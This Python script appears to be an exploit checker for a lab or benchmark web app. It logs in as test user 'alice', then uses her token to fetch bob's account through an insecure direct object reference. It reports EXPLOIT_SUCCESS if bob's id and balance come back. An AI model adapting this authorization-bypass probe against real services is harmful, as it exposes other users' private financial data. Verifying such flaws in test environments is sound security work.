import os
import sys
import requests

def main():
    base_url = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')

    # Step 1: Authenticate as alice
    try:
        login_resp = requests.post(
            f'{base_url}/api/auth/login',
            json={'Username': 'alice', 'Password': 'alice-pw'},
            timeout=5
        )
    except Exception as e:
        print(f'EXPLOIT_FAIL: login request error — {e}')
        sys.exit(0)

    if login_resp.status_code != 200:
        print(f'EXPLOIT_FAIL: login failed with status {login_resp.status_code}')
        sys.exit(0)

    token = login_resp.json().get('token')
    if not token:
        print('EXPLOIT_FAIL: no token in login response')
        sys.exit(0)

    # Step 2: Use alice's token to access bob's account (IDOR)
    try:
        acct_resp = requests.get(
            f'{base_url}/api/account/bob',
            headers={'Authorization': f'Bearer {token}'},
            timeout=5
        )
    except Exception as e:
        print(f'EXPLOIT_FAIL: account request error — {e}')
        sys.exit(0)

    if acct_resp.status_code == 200:
        data = acct_resp.json()
        acc_id = data.get('id', '')
        balance = data.get('balance', '')
        if str(acc_id).lower() == 'bob':
            print(f"EXPLOIT_SUCCESS: alice's token read bob's account — id={acc_id} balance={balance}")
        else:
            print(f'EXPLOIT_FAIL: got 200 but unexpected account data — {data}')
    elif acct_resp.status_code == 403:
        print('EXPLOIT_FAIL: server correctly returned 403 Forbidden — ownership check is enforced')
    elif acct_resp.status_code == 401:
        print('EXPLOIT_FAIL: server returned 401 Unauthorized')
    else:
        print(f'EXPLOIT_FAIL: unexpected status {acct_resp.status_code} — {acct_resp.text[:200]}')

    sys.exit(0)

main()

